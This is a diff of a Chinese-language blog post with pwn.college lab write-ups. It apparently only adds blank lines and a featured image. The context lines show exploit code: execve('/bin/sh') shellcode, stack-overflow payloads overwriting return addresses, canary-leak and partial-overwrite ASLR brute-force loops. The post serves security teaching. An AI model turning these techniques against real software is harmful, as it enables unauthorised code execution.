@@ -9,7 +9,7 @@ tags:
   - 栈漏洞
 categories:
   - 二进制安全
-draft: true
+featuredImage: https://cdn.jsdelivr.net/gh/SignorMercurio/blog-cdn/PwnCollege/0.png
 ---
 
 时隔许久，我居然又得做 pwn 题了。
@@ -174,6 +174,7 @@ subprocess.Popen(binary).wait()
 ### 29
 
 29-35 模版，核心代码位于 `/* TODO */` 处：
+
 ```cpp
 #include <unistd.h>
 #include <sys/wait.h>
@@ -192,6 +193,7 @@ int main() {
 ```
 
 核心代码：
+
 ```cpp
 int pid = fork();
 
@@ -205,9 +207,11 @@ if (pid == 0) {
 `fork()` 出子进程执行二进制文件，使得其父进程为我们自己的程序。
 
 ### 30
+
 同上。
 
 ### 31
+
 ```cpp
 char *argv[] = {binary, "pxcsyjgoss", NULL};
 int pid = fork();
@@ -220,6 +224,7 @@ if (pid == 0) {
 ```
 
 ### 32
+
 ```cpp
 char *argv[] = {binary, "pxcsyjgoss", NULL};
 char *env[] = {"kzdezt=fgdnllplui", NULL};
@@ -233,6 +238,7 @@ if (pid == 0) {
 ```
 
 ### 33
+
 ```cpp
 int fd = open("/tmp/igzuqf", O_RDWR);
 int pid = fork();
@@ -248,6 +254,7 @@ if (pid == 0) {
 ```
 
 ### 34
+
 ```cpp
 int fd = open("/tmp/bkvmkz", O_RDWR);
 int pid = fork();
@@ -301,6 +308,7 @@ $ cat | /challenge/$HOSTNAME
 ```shell
 $ rev | /challenge/$HOSTNAME
 ```
+
 倒序输入密码，`Ctrl+D`。
 
 ### 42-47
@@ -308,6 +316,7 @@ $ rev | /challenge/$HOSTNAME
 类似 36-41，但用 shell 脚本执行。
 
 ### 48
+
 ```python
 import subprocess
 import os
@@ -319,12 +328,14 @@ p2.communicate()
 ```
 
 48-53 都需要：
+
 ```shell
 $ ipython
 > %run interact.py
 ```
 
 ### 49
+
 ```python
 import subprocess
 import os
@@ -336,6 +347,7 @@ p2.communicate()
 ```
 
 ### 50
+
 ```python
 import subprocess
 import os
@@ -347,6 +359,7 @@ p2.communicate()
 ```
 
 ### 51
+
 ```python
 import subprocess
 import os
@@ -359,6 +372,7 @@ p3.communicate()
 ```
 
 ### 52
+
 ```python
 import subprocess
 import os
@@ -370,6 +384,7 @@ p2.communicate()
 ```
 
 ### 53
+
 ```python
 import subprocess
 import os
@@ -379,6 +394,7 @@ p1 = subprocess.Popen("rev", stdout=subprocess.PIPE)
 p2 = subprocess.Popen(binary, stdin=p1.stdout)
 p2.communicate()
 ```
+
 倒序输入密码，`Ctrl+D`。
 
 ### 54-59
@@ -390,11 +406,13 @@ p2.communicate()
 类似 36-41，但使用 29 的方法编译出 `a.out` 并执行。
 
 ### 66
+
 ```shell
 $ find /challenge/ -name embryoio* -exec {} \;
 ```
 
 ### 67
+
 ```shell
 $ find /challenge/ -name embryoio* -exec {} uwazdyddun \;
 ```
@@ -402,6 +420,7 @@ $ find /challenge/ -name embryoio* -exec {} uwazdyddun \;
 ### 68
 
 68-73 模版：
+
 ```cpp
 #include <unistd.h>
 #include <sys/wait.h>
@@ -411,13 +430,14 @@ void pwncollege() {}
 int main() {
     char binary[30] = "/challenge/";
     strcat(binary, getenv("HOSTNAME"));
-    
+
     /* TODO */
     return 0;
 }
 ```
 
 核心代码：
+
 ```cpp
 int i;
 char *argv[200];
@@ -432,6 +452,7 @@ execve(binary, argv, NULL);
 ```
 
 ### 69
+
 ```cpp
 execve(binary, NULL, NULL);
 ```
@@ -444,6 +465,7 @@ execve(binary, NULL, env);
 ```
 
 ### 71
+
 ```cpp
 int i;
 char *env[] = {"254=xeqznkovla", NULL};
@@ -459,6 +481,7 @@ execve(binary, argv, env);
 ```
 
 ### 72
+
 ```sh
 #!/bin/bash
 cd /tmp/ehpfci
@@ -466,12 +489,14 @@ cd /tmp/ehpfci
 ```
 
 ### 73
+
 ```sh
 #!/bin/bash
 bash -c 'cd /tmp/wvliga && /challenge/$HOSTNAME'
 ```
 
 ### 74
+
 ```python
 from pwn import *
 
@@ -581,6 +606,7 @@ $ ar p flag.bak
 ## embryoasm: Assembly Refresher
 
 模版：
+
 ```python
 from pwn import *
 import os
@@ -605,11 +631,13 @@ mov rdi, 0x1337
 ```
 
 ### 2
+
 ```asm
 add rdi, 0x331337
 ```
 
 ### 3
+
 ```asm
 imul rdi, rsi
 add rdi, rdx
@@ -626,6 +654,7 @@ div rsi
 ```
 
 ### 5
+
 ```asm
 mov rax, rdi
 div rsi
@@ -655,6 +684,7 @@ mov rax, rdi
 ```
 
 ### 8
+
 ```asm
 and rdi, rsi
 xor rax, rax
@@ -662,6 +692,7 @@ or rax, rdi
 ```
 
 ### 9
+
 ```asm
 and rdi, 1
 xor rdi, 1
@@ -679,6 +710,7 @@ add QWORD PTR [0x404000],0x1337
 ```
 
 ### 11
+
 ```asm
 mov al, BYTE PTR [0x404000]
 mov bx, WORD PTR [0x404000]
@@ -698,6 +730,7 @@ mov [rsi],rcx
 ```
 
 ### 13
+
 ```asm
 mov rax, QWORD PTR [rdi]
 mov rbx, QWORD PTR [rdi+8]
@@ -706,6 +739,7 @@ mov [rsi], rax
 ```
 
 ### 14
+
 ```asm
 pop rax
 sub rax, rdi
@@ -713,6 +747,7 @@ push rax
 ```
 
 ### 15
+
 ```asm
 push rdi
 push rsi
@@ -721,6 +756,7 @@ pop rsi
 ```
 
 ### 16
+
 ```asm
 mov rax, [rsp+24]
 add rax, [rsp+16]
@@ -878,6 +914,7 @@ ret
 ## babyshell: Shellcode Injection
 
 模版：
+
 ```python
 from pwn import *
 
@@ -893,6 +930,7 @@ p.interactive()
 ### 1
 
 ORW 方法:
+
 ```python
 # read(0, address of rip, 1000)
 sc1 = """
@@ -910,6 +948,7 @@ p.send(nop*16 + asm(sc2))
 ```
 
 拿 Shell 方法:
+
 ```python
 # execve("/bin/sh\x00",["/bin/sh\x00", "-p\x00\x00"],NULL)
 sc = """
@@ -1209,6 +1248,7 @@ size = 0xffffffff
 
 s(payload, size)
 ```
+
 ### 5.0
 
 需要做一次乘法后得到溢出的结果，可以用 2 * 2147483648 得到。
@@ -1223,6 +1263,7 @@ sla('to send: ', num)
 sla('record: ', size)
 sa('bytes)!\n', payload)
 ```
+
 ### 6.0
 
 题目给了做法，就是跳到检查语句后面的地址就可以绕过检查。
@@ -1232,6 +1273,7 @@ win = 0x402177
 payload = b'a'*88+p64(win)
 s(payload)
 ```
+
 ### 7.0
 
 和 6.0 一样需要跳到检查语句后面，IDA 可以看到这个地址是 0x358，区别在于开启了 ASLR 我们只能确定地址的后三位。这里使用的技巧是仅仅覆盖最后两个字节，此时倒数第 4 个 bit 有 1/16 的概率猜对，多运行几次即可。
@@ -1245,7 +1287,7 @@ payload = b'a'*72+p16(win)
 while True:
     p = process(binary)
     s(payload)
-    
+
     res = p.recvall()
     if b'pwn.college{' in res:
         print(res[-100:])
@@ -1332,7 +1374,7 @@ while True:
 
     payload = b'a'*0x18 + p64(canary) + b'a'*8 + p16(win)
     s(payload)
-    
+
     res = p.recvall()
     if b'pwn.college{' in res:
         print(res[-100:])
@@ -1366,7 +1408,7 @@ while True:
 
     payload = b'a'*280 + p64(canary) + b'a'*8 + p16(win)
     s(payload)
-    
+
     res = p.recvall()
     if b'pwn.college{' in res:
         print(res[-100:])
@@ -1636,4 +1678,3 @@ payload = asm(sc).ljust(0x78, b'a') + p32(0) + p32(1) + p32(0x5a)
 payload += b'a'*4 + p64(canary) + b'a'*0x18 + p64(chall2_buf)
 s(payload)
 ```
-
